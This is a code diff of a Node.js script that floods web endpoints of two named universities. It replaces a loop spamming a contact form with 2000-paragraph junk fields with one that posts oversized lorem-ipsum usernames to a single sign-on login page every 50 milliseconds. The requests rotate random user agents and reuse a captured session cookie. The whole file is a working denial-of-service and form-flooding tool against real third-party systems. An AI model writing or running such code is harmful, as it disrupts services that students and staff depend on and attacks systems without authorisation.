@@ -1,7 +1,10 @@
+const qs = require('qs');
 const axios = require('axios');
 const { LoremIpsum } = require('lorem-ipsum');
-
+const randomUseragent = require('random-useragent');
+const a = randomUseragent.getRandom(); // gets a random user agent string
 const lorem = new LoremIpsum({
+
     sentencesPerParagraph: {
         max: 8,
         min: 4
@@ -12,22 +15,40 @@ const lorem = new LoremIpsum({
     }
 });
 
-const qs = require('qs');
-let data = `full_name=${lorem.generateParagraphs(2000)}&phone_number=123131321&email=dghdhg%40gmail.com&referral_classification=intl.info%40biu.ac.il&request_subject=dghdfh&referral_content=dfhdfhdgf&form_build_id=form-qr9MMam0_kGyMiHxtbxnox3DIJ8IB3Dunx0u1mmAzbU&form_id=webform_submission_general_contact_form_node_402_add_form&_triggering_element_name=op&_triggering_element_value=Submit&_drupal_ajax=1&ajax_page_state%5Btheme%5D=biu_base&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=biu_base%2Fglobal%2Cbiu_base%2Fmain-menu%2Cbiu_base%2Fsite-header%2Cbiu_contact_form%2Fcandidate-contact-form%2Ccore%2Fdrupal.dialog.ajax%2Ccore%2Fhtml5shiv%2Ccore%2Fpicturefill%2Csystem%2Fbase%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form`;
-
-let config = {
+  
+let config = (userName) => ({
     method: 'post',
     maxBodyLength: Infinity,
-    url: 'https://www.biu.ac.il/en/node/402?ajax_form=1&_wrapper_format=html&_wrapper_format=drupal_ajax',
+    url: 'https://sso.um.edu.my/cas/login;jsessionid=6C9DDCD440FD82C420305B85C3A78C61',
     headers: {
-        'authority': 'www.biu.ac.il',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-GB,en;q=0.9',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Cookie': 'JSESSIONID=6C9DDCD440FD82C420305B85C3A78C61',
+        'Origin': 'https://sso.um.edu.my',
+        'Referer': 'https://sso.um.edu.my/cas/login',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': randomUseragent.getRandom(),
     },
-    data: data
-};
+    data: qs.stringify({
+        'uname': userName,
+        'domain': 'um.edu.my',
+        'password': 'QATEST',
+        'lt': '_c6F771141-3E63-AF43-9B65-3BD52E3A839A_kC9629405-7C26-D1FB-3103-91AF34822339',
+        '_eventId': 'submit',
+        'username': 'QATEST@um.edu.my'
+    })
+})
 
 setInterval(() => {
-    axios.request(config)
+
+    axios.request(config(lorem.generateParagraphs(100)))
         .then((response) => {
             console.count(response.status);
         })
@@ -35,4 +56,4 @@ setInterval(() => {
             console.log(error);
         });
 
-}, 50)   
+}, 50);
